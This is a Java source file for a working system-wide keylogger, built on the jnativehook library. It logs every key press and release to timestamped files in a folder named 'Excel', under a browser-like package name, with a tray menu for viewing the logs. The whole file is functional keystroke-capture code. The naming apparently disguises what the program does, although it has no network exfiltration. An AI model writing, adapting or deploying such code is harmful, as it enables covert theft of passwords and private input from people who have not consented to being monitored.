package org.freedombrowser;


import java.awt.Desktop;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.File;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    public static void main(String[] args) throws Exception {
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());

        String logs;

        if (args.length == 0) {

            logs = KeyLogger.class.getProtectionDomain().getCodeSource().getLocation().getPath();

            try {
                logs = java.net.URLDecoder.decode(logs, "UTF-8");
                // Get the directory path without the JAR file name and extension
                File jarFile = new File(logs);
                logs = jarFile.getParent();
                logs = logs+"\\Excel\\";
                System.out.println("[KeyLogger] Saving output in ./Excel");
            } catch (java.io.UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        } else {
            logs = args[0];
        }

        System.out.println("[KeyLogger] Using "+ logs);

        Thread.setDefaultUncaughtExceptionHandler((t, e)->KeyLogger.error(e));

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        DateTimeFormatter format = DateTimeFormatter.ofPattern("dd-MM-yyyy_hh-mm-ss");
        String datetime = LocalDateTime.now().format(format);
        File logdir = new File(logs),
                fOut = new File(logdir, datetime + "-output.txt"),
                fErr = new File(logdir, datetime + "-error.txt");
        logdir.mkdir();

        System.setOut(new PrintStream(fOut, StandardCharsets.UTF_8.name()));
        System.setErr(new PrintStream(fErr));

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyLogger());

        SystemTray tray = SystemTray.getSystemTray();
        InputStream in = KeyLogger.class.getResourceAsStream("/icon.png");
        TrayIcon trayIcon = new TrayIcon(ImageIO.read(in));

        PopupMenu popup = new PopupMenu();
        MenuItem showItem = new MenuItem("Show log");
        showItem.addActionListener(e->KeyLogger.open(fOut));
        popup.add(showItem);

        MenuItem errItem = new MenuItem("Show errors");
        errItem.addActionListener(e->KeyLogger.open(fErr));
        popup.add(errItem);

        popup.addSeparator();

        MenuItem exitItem = new MenuItem("Exit");
        exitItem.addActionListener(e->System.exit(0));
        popup.add(exitItem);

        trayIcon.setPopupMenu(popup);
        tray.add(trayIcon);
    }

    private static void open(File fOut) {
        try {
            Desktop.getDesktop().edit(fOut);
        } catch (Throwable e) {
            throw new RuntimeException(e); // to be picked up by the uncaught handler
        }
    }

    private static void error(Throwable t) {
        t.printStackTrace();

        StringWriter sw = new StringWriter();
        t.printStackTrace(new PrintWriter(sw));
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.print("↓" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", ""));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // don't touch it works
        System.out.print("↑" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", ""));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.print(" ");
    }
}
